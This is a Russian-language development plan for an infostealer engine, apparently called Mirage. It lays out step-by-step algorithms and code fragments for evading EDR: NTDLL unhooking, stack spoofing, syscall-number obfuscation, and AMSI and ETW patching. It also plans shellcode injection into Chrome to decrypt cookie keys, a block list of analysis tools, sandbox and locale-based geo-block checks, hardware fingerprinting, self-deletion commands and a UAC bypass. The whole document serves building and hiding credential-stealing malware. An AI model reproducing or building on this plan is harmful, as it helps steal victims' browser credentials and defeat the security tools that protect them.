# Phase 9: Engine Hardening — Implementation Plan

**Цель:** Усиление ядра стилера: EDR evasion, расширенный анти-анализ, самозащита.
**Всего задач:** 23 | **Оценка:** ~7 дней | **Сложность:** Высокая

---

## Dependency Map

```
9.1 (сисколлы + EDR bypass)
  ├─ Нужно: engine.zig расширение (6 новых сисколлов)
  ├─ NTDLL unhook ← зависит от NtOpenSection + NtUnmapViewOfSection
  ├─ Stack spoofing ← зависит от RtlLookupFunctionEntry (уже в ntdll)
  ├─ FreshyCalls ← альтернатива Halo's Gate (не зависит, параллельно)
  ├─ SSN obfuscation ← зависит от FreshyCalls или существующей таблицы SSN
  ├─ AMSI + ETW bypass ← зависит от LoadLibrary + VirtualProtect (уже есть)
  └─ DBSC bypass ← Chrome shellcode inject (зависит от NtCreateThreadEx)

9.2 (анти-анализ)
  ├─ process_list ← NtQuerySystemInformation (уже есть)
  ├─ disk/uptime/mouse ← простые WinAPI вызовы
  ├─ geo_block ← GetKeyboardLayout/GetSystemDefaultLangID
  ├─ hwid ← disk ioctl + registry
  └─ pipeline usage ← зависит от существующего main.zig

9.3 (самозащита)
  ├─ self_delete ← NtDeleteFile / NtSetInformationFile
  ├─ temp_wipe ← NtCreateFile + NtDeleteFile (зависит от NtDeleteFile)
  └─ uac_bypass ← registry + CreateProcess (не зависит)
```

---

## 9.1 Syscall — EDR Evasion (10 задач, ~3 дня)

### 9.1.1 Новые сисколлы в engine.zig + stubs.zig

**Что делаем:** Добавляем 6 новых сисколлов в существующий пайплайн.

| Syscall | Нужен для |
|---------|-----------|
| `NtOpenSection` | Открытие \KnownDlls\ntdll.dll для unhook |
| `NtUnmapViewOfSection` | Освобождение clean mapping после unhook |
| `NtCreateThreadEx` | Remote thread creation (Discord inject, DBSC bypass) |
| `NtOpenProcess` | Remote process open (inject, App-Bound bypass) |
| `NtResumeThread` | Thread control (App-Bound inject) |
| `NtSuspendThread` | Thread control (App-Bound inject) |
| `NtDeleteFile` | Self-delete Level 1 (native API) |

**Файлы для модификации:**
- `src/syscalls/engine.zig`
  - Добавить `pub export var ssn_NtXxx` для каждого
  - Добавить `extern fn NtXxx_stub(...)` declaration
  - Добавить `resolveAndAssign()` в `resolve()`
  - Добавить Zig wrapper function
- `src/syscalls/stubs.zig`
  - Добавить 7 asm stubs с gadget pool dispatch (rdtsc & gadget_pool pattern)
- `src/types/types.zig`
  - Добавить SECTION_INHERIT, SECTION_MAP_READ, OBJECT_ATTRIBUTES для section

**Референсы в raw/:**
- `zig-syscalls\syscall.zig` — generic как делать Zig syscall stubs
- `zcircuit\src\root.zig` — comptime Halo's Gate pattern
- `zig_offsec\Hells_Gate\main.zig` — базовый Hell's Gate

---

### 9.1.2 NTDLL Unhook (`src/evasion/ntdll_unhook.zig`)

**Метод:** \KnownDlls (самый надёжный, не требует чтения с диска)

**Алгоритм:**
```
1. NtOpenSection(&hSection, SECTION_MAP_READ, "\KnownDlls\ntdll.dll")
2. NtMapViewOfSection(hSection, NtCurrentProcess(), &cleanBase, ...)
3. Разобрать PE cleanBase:
   - IMAGE_DOS_HEADER → e_lfanew → IMAGE_NT_HEADERS64
   - .text секция: VirtualAddress + VirtualSize
4. Получить адрес .text текущего ntdll:
   - PEB → Ldr → InMemoryOrderModuleList → ntdll entry
   - IMAGE_NT_HEADERS64.OptionalHeader → .text VA + Size
5. Заменить hooked .text на clean .text:
   - NtProtectVirtualMemory(hooked_text, PAGE_EXECUTE_READWRITE)
   - memcpy(hooked_text, clean_text, text_size)
   - NtProtectVirtualMemory(hooked_text, PAGE_EXECUTE_READ)
6. NtUnmapViewOfSection(NtCurrentProcess(), cleanBase)
7. NtClose(hSection)
```

**Сисколлы:** NtOpenSection, NtMapViewOfSection, NtProtectVirtualMemory, NtClose, NtUnmapViewOfSection

**Референсы в raw/:**
- `thebear\src\AddrResolution.c` — hash-based PE parsing
- `thebear\include\ntdll.h` — NT structures
- `zcircuit\src\root.zig` — PE parsing на Zig

---

### 9.1.3 Stack Spoofing (`src/syscalls/stack_spoof.zig`)

**Метод:** SilentMoonwalk (ROP-based desync)

**Алгоритм:**
```
1. Определить адрес возврата (return address) — где мы будем вызывать сисколл
2. RtlLookupFunctionEntry(return_addr) → FunctionEntry (.pdata)
3. Создать CONTEXT с нужным RSP (fake stack)
4. RtlVirtualUnwind → возвращает unwound RSP и предполагаемый ReturnAddress
5. Сохранить реальный RSP в `shadow_rsp`
6. Сделать так чтобы unwinder "увидел" return address в ntdll, а не в нашем коде
7. Вызвать сисколл (через gadget)
8. NtContinue или восстановить RSP из shadow_rsp

Упрощённо: разрыв связи между реальным стеком вызовов и тем, что видит EDR при stack walk
```

**Важно:** Windows 11 24H2+ CET (Shadow Stack) может блокировать RET spoofing. Решение — использовать `NtContinue` для переключения.

**Файлы:**
- `src/syscalls/stack_spoof.zig` — новый
- `src/types/types.zig` — добавить UNWIND_HISTORY_TABLE, KNONVOLATILE_CONTEXT_POINTERS

**Референсы:** Внешние (нет в raw/):
- `klezVirus/SilentMoonwalk` (оригинал, C++)
- `Kudaes/Unwinder` (Rust)
- `WithSecureLabs/CallStackSpoofer` (C#)

---

### 9.1.4 FreshyCalls (`src/syscalls/freshycalls.zig`)

**Метод:** Все Zw* функции в ntdll отсортированы по VA. Их SSN = sorted_index.

**Алгоритм:**
```
1. PEB → Ldr → найти ntdll.dll
2. PE parsing → экспортная таблица (IMAGE_EXPORT_DIRECTORY)
3. Собрать все Zw* имена (AddresOfNames) и их VA (AddressOfFunctions)
4. Отсортировать записи по VA (адресу функции)
5. sorted_index = SSN для каждой функции
```

**Преимущество:** Не нужно читать тело каждой функции — экспортная таблица всегда чистая, даже если stubs заフッчены.

**Файлы:**
- `src/syscalls/freshycalls.zig` — новый (можно merge в engine.zig)
- `src/syscalls/engine.zig` — добавить `resolveFreshyCalls()` как альтернативу Halo's Gate

**Референсы в raw/:**
- `SentinelStealer\ChromiumDecryptor\Bootstrap.cpp` — динамическая сортировка экспортов
- `zcircuit\src\root.zig` — Zig pattern

---

### 9.1.5 SSN Obfuscation (`src/syscalls/ssn_obfuscation.zig`)

**Метод:** Хранение SSN в XOR-зашифрованном виде, расшифровка в asm stub

**Изменения в stubs.zig:**
```zig
// Было:
mov ssn_NtAllocateVirtualMemory(%rip), %eax

// Стало:
mov ssn_encrypted(%rip), %eax
xor eax, SSN_XOR_KEY(%rip)  // расшифровка
```

**В config.zig:**
```zig
pub const SSN_XOR_KEY: u32 = comptime 0xA3B5C7D9;  // Генерится случайно при сборке
pub const SSN_OBFUSCATED: [22]u32 = .{ ... };  // pre-xored SSN values
```

**Файлы:**
- `src/syscalls/ssn_obfuscation.zig` — генератор ключей и таблицы
- `src/syscalls/stubs.zig` — модификация всех 22+ stubs
- `src/config/config.zig` — добавление SSN_XOR_KEY

---

### 9.1.6 AMSI Bypass (`src/evasion/amsi_bypass.zig`)

**Простая заглушка:**
```
1. LdrLoadDll("amsi.dll") — уже есть dll_loader.zig
2. export_resolve.getFunctionByHash("AmsiScanBuffer") — уже есть
3. NtProtectVirtualMemory(addr, 1, PAGE_EXECUTE_READWRITE) — уже есть
4. *(addr) = 0xC3  // RET
5. NtProtectVirtualMemory(addr, 1, PAGE_EXECUTE_READ) — уже есть
```

---

### 9.1.7 ETW Bypass (`src/evasion/etw_bypass.zig`)

**Аналогично AMSI:**
```
1. export_resolve.getFunctionByHash(ntdll, "EtwEventWrite")
2. NtProtectVirtualMemory → *addr = 0xC3 → restore
```

---

### 9.1.8 Registry Unhook Verification (`src/evasion/registry_unhook.zig`)

Проверка что registry-функции не заフッчены после NTDLL unhook:
- NtOpenKey, NtQueryValueKey, NtCreateKey, NtEnumerateKey, NtDeleteKey
- Если какая-то ещё hooked → unhook через общий NTDLL механизм

**Фактически:** Просто логирование. После 9.1.2 NTDLL unhook починит всё сразу.

---

### 9.1.9 DBSC Bypass (`src/browsers/dbsc_bypass.zig`)

**Проблема:** Chrome 147+ DBSC (Device Bound Session Credentials) — куки привязаны к TPM устройства. Их нельзя просто скопировать на другой ПК.

**Решение:** Шеллкод внутри Chrome.exe для вызова IElevator::DecryptData

**Алгоритм:**
```
1. Найти Chrome.exe установку (registry или LOCALAPPDATA)
2. Создать процесс Chrome с флагом --headless (или существующий)
3. NtAllocateVirtualMemory(chrome_handle) → NtWriteVirtualMemory(shellcode)
4. NtCreateThreadEx(chrome_handle, shellcode) → запуск
5. Shellcode внутри Chrome:
   - CoCreateInstance(IElevator CLSID)
   - IElevator::DecryptData(encrypted_key)
   - Записать результат в shared memory / pipe
6. Прочитать расшифрованный ключ из pipe
7. Использовать ключ для расшифровки кук на сервере (или на билде)
```

**Референсы в raw/:**
- `DumpBrowserSecrets\DumpBrowserSecrets\InjectDllIntoChromium.cpp` — Early Bird APC inject
- `DumpBrowserSecrets\DllExtractChromiumSecrets\DllMain.cpp` — DLL внутри Chrome
- `Mirage\src\browsers\appbound.zig` — уже есть IElevator COM (но без инжекта)

---

## 9.2 Evasion — Расширение анти-анализа (10 задач, ~2.5 дня)

### 9.2.1 Process List (`src/evasion/process_list.zig`)

**Метод:** NtQuerySystemInformation(SystemProcessInformation) → hash-сравнение имён

```
Блок-лист (40+):
taskmgr, procexp, procexp64, procmon, procmon64, wireshark, dumpcap,
fiddler, ProcessHacker, x64dbg, x32dbg, x96dbg, ollydbg, ida, ida64,
ghidra, windbg, dbgview, cheatengine, httppmon, tcpview, vmtoolsd,
vboxservice, vboxtray, api_monitor, pestudio, rundll32 (exploit),
powershell_ise, code.exe (VSCode debug), httpdebug, sysinternals*
```

**Алгоритм:**
```
NtQuerySystemInformation(SystemProcessInformation, buf, size, &retLen)
for each SYSTEM_PROCESS_INFORMATION:
    hash = calcHash(ImageName)
    for each banned_hash:
        if hash == banned_hash:
            score += 15
            if score > threshold: exit
```

**Референсы в raw/:**
- `skuld\modules\antidebug\antidebug.go` — 40+ процессов, 90+ window titles
- `ferrox\src\padding.rs` — Rust parent process check
- `PhantomStealer\AntiAnalysis.cs` — WMI process query

---

### 9.2.2 Disk Check (`src/evasion/disk_check.zig`)

```
GetDiskFreeSpaceEx("C:\", &free, &total, &totalFree)
if total < 60 GB → score += 20 (sandbox)
```

---

### 9.2.3 Uptime Check (`src/evasion/uptime_check.zig`)

```
GetTickCount64() < 30 min → score += 15 (fresh sandbox)
```

**Использовать** kernel32!GetTickCount64 через hash-resolve.

---

### 9.2.4 Mouse Check (`src/evasion/mouse_check.zig`)

```
user32!GetCursorPos(&pos1)
NtDelayExecution(2000ms)  // уже есть syscall
user32!GetCursorPos(&pos2)
if pos1 == pos2 → score += 10 (no user input → sandbox)
```

---

### 9.2.5 Geo-block (`src/evasion/geo_block.zig`)

**Тройная проверка:**

**Уровень 1 — Keyboard Layout:**
```
GetKeyboardLayoutList(0, NULL) → count
GetKeyboardLayoutList(count, layouts)
for each layout:
    langID = LOWORD(layouts[i])
    primary = PRIMARYLANGID(langID)
    if primary == LANG_RUSSIAN(0x19) or LANG_UKRAINIAN(0x22) or ...
```

**Уровень 2 — System Locale:**
```
GetSystemDefaultLangID() → PRIMARYLANGID
```

**Уровень 3 — Timezone:**
```
GetTimeZoneInformation(&tzi)
// UTC+3..12 → пост-советское пространство
```

**Уровень 4 (серверный) — IP Geo:**
```
POST /api/geo → Panel проверяет IP через GeoIP базу
Panel возвращает: allowed / blocked
```

**Логика:** Если 2+ из 4 совпадают → **exit** (score = 100, threshold = 60)

---

### 9.2.6 HWID Generation (`src/evasion/hwid.zig`)

**Алгоритм SHA-256 композиции:**
```
1. Disk serial:
   NtCreateFile("\\.\PhysicalDrive0")
   IOCTL_STORAGE_QUERY_PROPERTY → StorageDeviceProperty
   Читаем SerialNumberOffset из STORAGE_DEVICE_DESCRIPTOR

2. Motherboard:
   NtOpenKey(HKLM\HARDWARE\DESCRIPTION\System\BIOS)
   NtQueryValueKey("BaseBoardProduct")

3. MAC (первый физический):
   iphlpapi!GetAdaptersAddresses (dyn-resolve)
   Взять первый не-virtual adapter, его PhysicalAddress

4. Windows ProductID:
   NtOpenKey(HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion)
   NtQueryValueKey("ProductId")

5. Compose:
   raw = disk_serial + "|" + motherboard + "|" + mac_str + "|" + product_id
   hwid = std.crypto.sha2.Sha256.hash(raw)  // 32 байта
   hwid_hex = std.fmt.bytesToHex(hwid)      // 64 hex символа
```

**Файлы:** `src/evasion/hwid.zig`

**Референсы в raw/:**
- `SentinelStealer\Helper\ClientInformation.cs` — MD5 HWID
- `skuld\utils\hardware\hardware.go` — wmic UUID + MAC
- `ferrox\src\fingerprint.rs` — MachineGuid registry

---

### 9.2.7 Config — SLEEP/JITTER Usage

**Сейчас:** `SLEEP_MIN_MS = 5000`, `SLEEP_JITTER_MS = 3000` есть в config.zig, но НЕ используются в main.zig.

**Исправить:** Вставить в `buildReport()` рандомную задержку между каждым collector'ом:
```zig
// В начале main.zig pipeline
const sleep_ms = config.SLEEP_MIN_MS + (config.SLEEP_JITTER_MS * @mod(hw_random(), 100) / 100);
var interval: i64 = -@as(i64, @intCast(sleep_ms * 10000)); // 100ns units
NtDelayExecution(0, &interval);
```

---

### 9.2.8 Config — HWID Ban List

```zig
// В config.zig (заполняется Builder'ом при сборке)
pub const HWID_BAN_LIST: []const []const u8 = &.{
    "abc123deadbeef...",
};
```

В `main.zig` после `initAntiEvasion()`:
```zig
const hwid = hwid_mod.generate();
for (config.HWID_BAN_LIST) |banned| {
    if (std.mem.eql(u8, hwid, banned)) return;  // забанен
}
```

---

## 9.3 Self-Defense (4 задачи, ~1.5 дня)

### 9.3.1 NtDeleteFile syscall (добавить в engine.zig + stubs.zig)

Уже описано в 9.1.1. Отдельно:
- Используется для Level 1 self-delete
- Подпись: `NtDeleteFile(OBJECT_ATTRIBUTES*) → NTSTATUS`

---

### 9.3.2 Self-Delete (`src/cleanup/self_delete.zig`)

**3 уровня fallback:**

**Level 1 — NtSetInformationFile (native, stealthy):**
```
1. NtCreateFile(exe_path, DELETE | SYNCHRONIZE, ...)
2. FILE_DISPOSITION_INFORMATION { DeleteFile = TRUE }
3. NtSetInformationFile(hFile, &ioStatus, &fdi, sizeof(fdi), FileDispositionInformation)
4. NtClose(hFile) → файл удалён при закрытии последнего handle
```

**Level 2 — MoveFileEx (fallback):**
```
MoveFileExW(exe_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)
```

**Level 3 — cmd.exe (last resort):**
```
CreateProcessW(NULL, "cmd.exe /c ping 127.0.0.1 -n 3 & del /f /q " + exe_path, ...)
```

**Дополнительно:** `overwrite_with_nulls()` перед удалением (из ferrox).

**Референсы в raw/:**
- `ferrox\src\dissolve.rs` — batch + overwrite with nulls
- `PhantomStealer\SelfDestruct.cs` — batch melt
- `thebear\include\ntdll.h` — FILE_DISPOSITION_INFORMATION struct

---

### 9.3.3 Temp Wipe (`src/cleanup/temp_wipe.zig`)

После отработки и отправки:
```
1. Получить %TEMP% директорию
2. NtCreateFile для каждого файла → NtDeleteFile
3. NtCreateFile для директории → NtDeleteFile (пустая)
```

**Примечание:** Использует NtDeleteFile syscall.

---

### 9.3.4 UAC Bypass (`src/evasion/uac_bypass.zig`)

**Метод:** CMSTPLUA COM Elevation (работает на Win 11 24H2)

**Алгоритм:**
```
1. Проверить: IsUserAnAdmin() или NtOpenProcessToken → TokenElevation
2. Если уже admin → continue в main pipeline
3. Если не admin:
   a. CoCreateInstance(CLSID_CMSTPLUA, ..., CLSCTX_LOCAL_SERVER, IID_IUnknown, &pUnk)
   b. ICMSTPLUA::Execute(szCommandLine)
   c. Sleep(1000) → ждём пока запустится
   d. ExitProcess(0) — старый процесс завершается, новый (elevated) продолжает
```

**Референсы в raw/:**
- `skuld\modules\uacbypass\bypass.go` — Fodhelper technique
- `Browser-Data-Grabber\src\generator\stubgenerator.cpp` — runas verb

---

## Execution Order

```
День 1: Сисколлы + FreshyCalls
  ├─ 6 новых сисколлов в engine.zig + stubs.zig (NtOpenSection, NtUnmapViewOfSection,
  │  NtCreateThreadEx, NtOpenProcess, NtResumeThread, NtSuspendThread, NtDeleteFile)
  ├─ FreshyCalls resolve
  └─ SSN obfuscation

День 2: NTDLL unhook + stack spoofing
  ├─ NtOpenSection → \KnownDlls → clean .text mapping → replace hooked
  ├─ Stack spoofing (SilentMoonwalk)
  └─ Registry/AMSI/ETW bypass

День 3: Process list + sandbox checks + HWID
  ├─ Process list (NtQuerySystemInformation)
  ├─ Disk < 60GB, uptime < 30min, mouse check
  ├─ HWID generation
  └─ Config: SLEEP usage + HWID ban list

День 4: Geo-block + серверная валидация
  ├─ Keyboard layout + system locale + timezone
  ├─ Panel endpoint /api/geo
  └─ Integration в anti_analysis.zig

День 5: Self-delete + temp wipe + UAC bypass
  ├─ NtSetInformationFile → MoveFileEx → cmd fallback
  ├─ Temp directory cleaning
  └─ CMSTPLUA COM elevation

День 6: DBSC bypass
  ├─ Chrome shellcode inject
  ├─ IElevator COM внутри Chrome
  └─ Pipe communication

День 7: Интеграция + тесты
  ├─ Все модули в main.zig pipeline
  ├─ Пороги скоринга
  ├─ Fallback chain self-delete
  └─ 20+ новых тестов
```

---

## Files Changed (Summary)

### Новые файлы (14):
| File | SLOC | Complexity |
|------|------|------------|
| `src/evasion/ntdll_unhook.zig` | ~80 | High |
| `src/syscalls/stack_spoof.zig` | ~120 | High |
| `src/syscalls/freshycalls.zig` | ~60 | Medium |
| `src/syscalls/ssn_obfuscation.zig` | ~40 | Low |
| `src/evasion/amsi_bypass.zig` | ~20 | Low |
| `src/evasion/etw_bypass.zig` | ~15 | Low |
| `src/evasion/registry_unhook.zig` | ~30 | Low |
| `src/evasion/process_list.zig` | ~60 | Medium |
| `src/evasion/geo_block.zig` | ~80 | Medium |
| `src/evasion/hwid.zig` | ~70 | Medium |
| `src/cleanup/self_delete.zig` | ~80 | Medium |
| `src/cleanup/temp_wipe.zig` | ~40 | Low |
| `src/evasion/uac_bypass.zig` | ~60 | Medium |
| `src/browsers/dbsc_bypass.zig` | ~100 | High |

### Модифицируемые файлы (6):
| File | Changes |
|------|---------|
| `src/syscalls/engine.zig` | +7 SSN globals, +stubs, +Zig wrappers, +resolveFreshyCalls() |
| `src/syscalls/stubs.zig` | +7 asm stubs, +SSN obfuscation in all stubs |
| `src/evasion/anti_analysis.zig` | +process_list, +disk, +uptime, +mouse, +geo checks, +weights |
| `src/config/config.zig` | +SSN_XOR_KEY, +HWID_BAN_LIST |
| `src/types/types.zig` | +SECTION, +UNWIND structures |
| `src/main.zig` | +SLEEP usage, +HWID ban check, +self-delete at end |

---

## Testing Strategy

| Module | Test Method | Validation |
|--------|-------------|------------|
| Сисколлы | debug output SSNs | non-zero, uniqueness |
| NTDLL unhook | isHooked() before/after | all stubs clean |
| Stack spoofing | EDR stack walk check | no Mirage frames |
| FreshyCalls | compare SSN vs Halo's Gate | identical |
| Process list | create fake process | detected |
| Disk/uptime | check on real PC | passes |
| Geo-block | change locale on test VM | aborts/continues |
| HWID | run twice | same HWID |
| Self-delete | run EXE, verify deleted | file gone |
| UAC bypass | run as user, verify elevation | UAC prompt bypassed |
| Integration | full pipeline | no crashes |
